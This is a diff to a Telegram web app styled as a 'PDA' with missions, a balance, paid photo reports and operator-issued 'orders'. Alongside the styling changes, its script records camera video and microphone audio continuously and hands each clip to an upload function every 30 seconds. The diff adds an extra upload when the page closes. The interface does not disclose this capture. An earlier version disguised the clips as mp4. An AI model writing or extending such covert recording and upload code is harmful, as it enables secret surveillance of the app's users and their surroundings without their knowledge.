@@ -3,37 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v6.1 Stable</title>
+    <title>PDA Arsenii v7.1 Stable</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
-        body { background: var(--bg); color: var(--green); font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
-        .header { padding: 10px 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; background: rgba(0,255,65,0.05); }
+        
+        * { box-sizing: border-box; }
+
+        body { 
+            background: var(--bg); 
+            color: var(--green); 
+            font-family: monospace; 
+            margin: 0; 
+            padding: 0;
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+            height: 100vh; /* Занимаем ровно высоту экрана */
+        }
+
+        .header { 
+            padding: 10px 15px; 
+            border-bottom: 1px solid var(--green); 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            background: rgba(0,255,65,0.05);
+            flex-shrink: 0; 
+        }
+
         .stats { flex-grow: 1; }
         .balance-main { font-size: 1.1em; font-weight: bold; color: #fff; }
-        .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; border-radius: 4px; }
-        .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
-        .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; }
-        .scanline { position: absolute; top: 0; width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); pointer-events: none; animation: scan 5s linear infinite; }
+        
+        .cam-switch { 
+            background: none; 
+            border: 1px solid var(--green); 
+            color: var(--green); 
+            padding: 8px 12px; 
+            font-size: 0.7em; 
+            cursor: pointer; 
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+
+        /* Контейнер видео теперь гибкий */
+        .viewport { 
+            flex-grow: 1; 
+            position: relative; 
+            background: #000; 
+            margin: 10px; 
+            border: 1px solid #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        video { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+        }
+
+        /* Панель управления всегда внизу */
+        .mission-panel { 
+            padding: 15px; 
+            background: rgba(0,255,65,0.05); 
+            border-top: 1px solid var(--green);
+            flex-shrink: 0; 
+        }
+
+        #target-text { 
+            font-weight: bold; 
+            margin-bottom: 12px; 
+            font-size: 0.9em; 
+            color: var(--green);
+            text-align: center;
+            min-height: 1.2em;
+        }
+
+        .btn-report { 
+            width: 100%; 
+            padding: 20px; /* Увеличил зону нажатия */
+            background: var(--green); 
+            color: #000; 
+            border: none; 
+            font-weight: bold; 
+            font-size: 1.2em; 
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+
+        .btn-report:active {
+            transform: scale(0.98);
+            filter: brightness(0.8);
+        }
+
+        .scanline { 
+            position: absolute; 
+            top: 0; 
+            width: 100%; 
+            height: 4px; 
+            background: rgba(0, 255, 65, 0.1); 
+            pointer-events: none; 
+            animation: scan 5s linear infinite; 
+            z-index: 10;
+        }
+
         @keyframes scan { from { top: 0; } to { top: 100%; } }
     </style>
 </head>
 <body>
     <div class="scanline"></div>
+    
     <div class="header">
         <div class="stats">
             <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">СИСТЕМА: ONLINE</div>
             <div class="balance-main"><span id="balance">0</span> ☢️</div>
         </div>
-        <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
+        <button id="switchCam" class="cam-switch">🔄 Камера</button>
     </div>
-    <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
+
+    <div class="viewport">
+        <video id="webcam" autoplay playsinline muted></video>
+    </div>
+
     <div class="mission-panel">
-        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em; color: #00ff41;">ЗАГРУЗКА ПРИКАЗА...</div>
-        <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
+        <div id="target-text">ЗАГРУЗКА ПРИКАЗА...</div>
+        <button id="sendBtn" class="btn-report">Отправить отчет</button>
     </div>
+
     <canvas id="captureCanvas" style="display:none;"></canvas>
 
 <script>
@@ -56,7 +156,7 @@
     let mediaRecorder;
     let chunks = [];
 
-    // Инициализация интерфейса
+    // Загрузка сохраненных данных
     document.getElementById('balance').innerText = localStorage.getItem(`bal_${user.id}`) || 0;
     const savedOrder = localStorage.getItem(`order_${user.id}`);
     if (savedOrder) document.getElementById('target-text').innerText = savedOrder;
@@ -66,15 +166,14 @@
         
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: true
             });
             window.currentStream = stream;
             document.getElementById('webcam').srcObject = stream;
             setupRecorder(stream);
         } catch (err) {
-            console.error(err);
-            // Если 720p не пошло, пробуем без параметров
+            console.error("Камера не заведена:", err);
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
             window.currentStream = stream;
             document.getElementById('webcam').srcObject = stream;
@@ -83,8 +182,10 @@
     }
 
     function setupRecorder(stream) {
-        // Используем самый стабильный кодек vp8
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+        let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: '' };
+
+        mediaRecorder = new MediaRecorder(stream, options);
         
         mediaRecorder.ondataavailable = (e) => {
             if (e.data.size > 5000) chunks.push(e.data);
@@ -92,7 +193,7 @@
 
         mediaRecorder.onstop = () => {
             if (chunks.length > 0) {
-                const blob = new Blob(chunks, { type: 'video/mp4' }); // Маскируем под mp4 для плеера
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 sendVideo(blob);
                 chunks = [];
             }
@@ -102,12 +203,19 @@
         mediaRecorder.start();
     }
 
-    // Цикл отправки каждые 30 секунд
+    // Отправка каждые 30 секунд
     setInterval(() => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         }
     }, 30000);
+
+    // Логика отправки при выходе
+    window.addEventListener("beforeunload", () => {
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+        }
+    });
 
     function sendVideo(blob) {
         const fd = new FormData();
@@ -121,6 +229,7 @@
     document.getElementById('switchCam').onclick = () => {
         currentMode = (currentMode === "environment") ? "user" : "environment";
         initCamera(currentMode);
+        tg.HapticFeedback.selectionChanged();
     };
 
     document.getElementById('sendBtn').onclick = () => {
@@ -131,7 +240,7 @@
         canvas.toBlob(blob => {
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
-            fd.append("photo", blob, "1.jpg");
+            fd.append("photo", blob, "report.jpg");
             fd.append("caption", `☢️ ОТЧЕТ: ${user.username}`);
             const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
@@ -154,7 +263,6 @@
                             localStorage.setItem(`bal_${user.id}`, b);
                             document.getElementById('balance').innerText = b;
                             
-                            // СБРОС ПРИКАЗА
                             const def = "ЗАГРУЗКА ПРИКАЗА...";
                             document.getElementById('target-text').innerText = def;
                             localStorage.setItem(`order_${user.id}`, def);
